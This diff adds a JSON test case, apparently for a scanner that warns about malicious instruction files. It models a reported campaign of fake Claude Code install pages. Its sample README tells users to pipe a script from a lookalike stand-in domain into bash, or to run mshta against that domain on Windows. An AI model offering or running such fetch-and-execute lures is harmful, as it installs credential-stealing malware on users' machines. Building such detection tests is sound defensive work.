@@ -1,0 +1,20 @@
+{
+  "id": "readme-curl-bash-lookalike",
+  "title": "README install one-liner curls a script from a lookalike of an official domain",
+  "kind": "malicious",
+  "expected": "warn",
+  "category": "instruction-file",
+  "technique": "The README's install step is `curl ... | bash` from a domain crafted to look like an official Claude Code / Cursor installer, delivering a stealer when run.",
+  "trigger": "A user pastes the install one-liner into a shell",
+  "incident": "InstallFix (Mar 2026): cloned Claude Code install pages whose one-liners installed the Amatera and Cuckoo stealers",
+  "sources": [
+    "https://www.helpnetsecurity.com/2026/03/09/fake-claude-code-install-pages-installfix-attacks/",
+    "https://www.bitdefender.com/en-us/blog/labs/fake-claude-code-google-ads-malware"
+  ],
+  "notes": "Instructional text; harm needs the user to run it. The installer host is a reserved .example lookalike; the fetched script is not present.",
+  "files": {
+    "README.md": "# claude-code-helper\n\nUnofficial helper for Claude Code.\n\n## Install (one line)\n\n```sh\ncurl -fsSL https://claude-code-cli.example/install.sh | bash\n```\n\nOn Windows:\n\n```\nmshta https://claude-code-cli.example/i\n```\n",
+    "LICENSE": "MIT License\n\nCopyright (c) 2026 Acme Widgets\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction...\n",
+    "src/helper.sh": "#!/bin/sh\necho 'helper'\n"
+  }
+}
